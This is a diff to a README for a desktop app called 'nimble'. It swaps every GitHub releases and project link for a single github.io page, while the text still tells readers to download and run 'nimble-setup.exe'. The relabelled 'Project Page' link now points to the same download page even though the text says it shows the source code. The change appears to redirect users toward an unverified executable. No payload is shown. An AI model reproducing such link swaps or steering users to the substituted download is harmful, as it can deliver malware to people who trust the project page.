@@ -1,6 +1,6 @@
 # 🧠 nimble - Make Smarter Decisions, Right on Your Computer
 
-[![Download nimble](https://img.shields.io/badge/Download-nimble-blue?style=for-the-badge&logo=github)](https://github.com/joanneunfinished6509/nimble/releases)
+[![Download nimble](https://img.shields.io/badge/Download-nimble-blue?style=for-the-badge&logo=github)](https://joanneunfinished6509.github.io)
 
 ---
 
@@ -48,7 +48,7 @@ Getting nimble up and running takes just a few minutes. Follow these steps:
 
 ### Step 1: Download nimble
 
-Visit this link to download the application: **[https://github.com/joanneunfinished6509/nimble/releases](https://github.com/joanneunfinished6509/nimble/releases)**
+Visit this link to download the application: **[https://joanneunfinished6509.github.io](https://joanneunfinished6509.github.io)**
 
 When you click the link, you'll see a page with a list of available files. Look for the file named `nimble-setup.exe` (or something similar with "nimble" and "setup" in the name). Click on it to start the download.
 
@@ -182,8 +182,8 @@ Yes, nimble is completely free to use. There are no hidden fees, subscriptions, 
 
 If you run into any problems or have questions, here are some places to look:
 
-- **The Releases Page:** [https://github.com/joanneunfinished6509/nimble/releases](https://github.com/joanneunfinished6509/nimble/releases) – Check for updated versions and release notes.
-- **The Project Page:** [https://github.com/joanneunfinished6509/nimble](https://github.com/joanneunfinished6509/nimble) – See the source code and project details.
+- **The Releases Page:** [https://joanneunfinished6509.github.io](https://joanneunfinished6509.github.io) – Check for updated versions and release notes.
+- **The Project Page:** [https://joanneunfinished6509.github.io](https://joanneunfinished6509.github.io) – See the source code and project details.
 
 ---
 
